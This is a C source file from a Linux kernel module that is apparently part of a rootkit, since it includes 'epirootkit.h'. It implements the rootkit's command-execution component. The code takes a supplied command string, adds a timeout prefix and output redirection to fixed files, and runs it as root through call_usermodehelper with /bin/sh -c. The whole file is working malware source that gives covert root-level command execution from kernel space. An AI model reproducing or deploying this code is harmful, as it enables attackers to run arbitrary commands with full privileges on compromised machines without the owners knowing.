#include <linux/kmod.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/types.h>

#include "epirootkit.h"

/**
 * trim_leading_whitespace - Remove leading whitespace from a string
 * @str: Input string
 *
 * Skips past any leading spaces, tabs, or newline characters.
 *
 * Return: Pointer to the first non-whitespace character.
 */
static char *trim_leading_whitespace(char *str) {
    while (*str == ' ' || *str == '\t' || *str == '\n')
        str++;
    return str;
}

/**
 * detect_redirections - Detects stdout and stderr redirection in a command string
 * @cmd: Command string to parse
 * @redirect_stdout: Set to true if stdout is redirected
 * @redirect_stderr: Set to true if stderr is redirected
 *
 * Scans the command for presence of '>' and '2>' to determine
 * if stdout or stderr redirection is being used explicitly.
 */
static void detect_redirections(const char *cmd, bool *redirect_stdout,
                                bool *redirect_stderr) {
    // __evann hates One Redirection
    char *redirect_stderr_add = strstr(cmd, "2>");
    char *redirect_stdout_add = strstr(cmd, ">");

    *redirect_stderr = (redirect_stderr_add != NULL);
    *redirect_stdout = (redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL);
}

/**
 * build_timeout_prefix - Constructs a timeout command prefix
 * @timeout: Timeout duration in seconds
 *
 * If timeout is greater than 0, constructs a timeout command with signal and status options.
 *
 * Return: Dynamically allocated string with the timeout prefix or an empty string.
 *         Caller must kfree() the returned string.
 */
static char *build_timeout_prefix(int timeout) {
    if (timeout <= 0)
        return kstrdup("", GFP_KERNEL);

    const char *base_cmd = "timeout --signal=SIGKILL --preserve-status";
    int size = snprintf(NULL, 0, "%s %d", base_cmd, timeout);
    char *timeout_cmd = kzalloc(size + 1, GFP_KERNEL);
    if (!timeout_cmd)
        return NULL;

    snprintf(timeout_cmd, size + 1, "%s %d", base_cmd, timeout);
    return timeout_cmd;
}

/**
 * build_full_command - Constructs the full shell command with redirections and timeout
 * @buffer: Destination buffer to store the final command string
 * @buffer_size: Size of the destination buffer
 * @timeout_cmd: Timeout prefix command
 * @user_cmd: User-supplied command
 * @redirect_stdout: True if stdout is redirected
 * @redirect_stderr: True if stderr is redirected
 * @catch_stds: True if we need to redirect output ourselves
 * @stdout_file: File to redirect stdout to (if needed)
 * @stderr_file: File to redirect stderr to (if needed)
 *
 * Builds a complete command string to be executed, including output redirection and timeout.
 *
 * Return: 0 on success, -EINVAL if the resulting command exceeds buffer size.
 */
static int build_full_command(char *buffer, size_t buffer_size,
                              const char *timeout_cmd, const char *user_cmd,
                              bool redirect_stdout, bool redirect_stderr,
                              bool catch_stds, const char *stdout_file,
                              const char *stderr_file) {
    const char *format;

    if ((redirect_stderr && redirect_stdout) || !catch_stds) {
        format = "%s %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd) >= buffer_size
            ? -EINVAL
            : 0;
    }
    else if (redirect_stderr) {
        format = "%s %s > %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd,
                        stdout_file)
                >= buffer_size
            ? -EINVAL
            : 0;
    }
    else if (redirect_stdout) {
        format = "%s %s 2> %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd,
                        stderr_file)
                >= buffer_size
            ? -EINVAL
            : 0;
    }
    else {
        format = "%s %s > %s 2> %s";
        return snprintf(buffer, buffer_size, format, timeout_cmd, user_cmd,
                        stdout_file, stderr_file)
                >= buffer_size
            ? -EINVAL
            : 0;
    }
}

/**
 * execute_command - Executes a shell command in usermode
 * @cmd_str: Full shell command string to execute
 * @envp: Array of environment variables
 *
 * Uses call_usermodehelper to execute the provided shell command.
 *
 * Return: Exit status of the command, or error code on failure.
 */
static int execute_command(const char *cmd_str, char *envp[]) {
    char *argv[] = { "/bin/sh", "-c", (char *)cmd_str, NULL };
    struct subprocess_info *sub_info;

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL,
                                         NULL, NULL);
    if (!sub_info)
        return -ENOMEM;

    return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
}

/**
 * exec_str_as_command_with_timeout - Executes a user command with optional timeout and output redirection
 * @user_cmd: Command string to execute
 * @catch_stds: Whether to redirect stdout and stderr to predefined files
 * @timeout: Timeout in seconds for the command; 0 means no timeout
 *
 * Constructs the final command string with timeout and redirection logic,
 * then executes it in usermode using the kernel's usermodehelper API.
 *
 * Return: Exit status of the command, or negative error code on failure.
 */
int exec_str_as_command_with_timeout(char *user_cmd, bool catch_stds,
                                     int timeout) {
    char *cmd_buffer = NULL;
    char *timeout_cmd = NULL;
    bool redir_stdout = false, redir_stderr = false;
    int status = 0;

    static char *envp[] = { "HOME=/", "TERM=xterm",
                            "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/tmp", NULL };

    user_cmd = trim_leading_whitespace(user_cmd);

    cmd_buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    if (!cmd_buffer)
        return -ENOMEM;

    detect_redirections(user_cmd, &redir_stdout, &redir_stderr);

    timeout_cmd = build_timeout_prefix(timeout);
    if (!timeout_cmd) {
        kfree(cmd_buffer);
        return -ENOMEM;
    }

    status = build_full_command(cmd_buffer, STD_BUFFER_SIZE, timeout_cmd,
                                user_cmd, redir_stdout, redir_stderr, catch_stds,
                                STDOUT_FILE, STDERR_FILE);

    if (status < 0) {
        DBG_MSG("Command too long or invalid\n");
        kfree(cmd_buffer);
        kfree(timeout_cmd);
        return status;
    }

    DBG_MSG("exec_str_as_command: executing command: %s\n", cmd_buffer);

    status = execute_command(cmd_buffer, envp);
    DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);

    kfree(cmd_buffer);
    kfree(timeout_cmd);

    return status;
}
